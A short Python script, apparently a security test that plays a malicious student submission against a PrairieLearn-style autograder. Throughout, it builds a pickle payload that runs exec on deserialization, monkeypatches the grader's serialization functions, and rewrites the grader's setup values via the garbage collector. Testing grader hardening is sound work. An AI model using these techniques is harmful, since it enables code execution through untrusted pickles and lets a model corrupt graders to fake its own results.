import base64
import builtins
import gc
import pickle
import sys


class Exploit:
    def __reduce__(self):
        return (builtins.exec, ("import builtins; builtins.grader_compromised = True",))


payload = base64.b64encode(pickle.dumps(Exploit())).decode()
runner = sys.modules["__main__"]
real_to_json = runner.to_json

# Forge whatever the runner would send if it serialized setup values on request.
runner.serialize_object_unsafe = lambda *args, **kwargs: payload
sys.modules["pytest_prairielearn_grader.utils"].serialize_object_unsafe = lambda *args, **kwargs: payload
runner.to_json = lambda v: payload if isinstance(v, int) and v == 999 else real_to_json(v)

# Find the setup namespace and replace its values.
for obj in gc.get_objects():
    if isinstance(obj, dict) and "add_twenty" in obj and "forged_value" in obj:
        obj["add_twenty"] = Exploit()
        obj["replaced_value"] = Exploit()
        obj["forged_value"] = 999

# Rebind a global that setup functions look up when they're called.
shared = "from student"
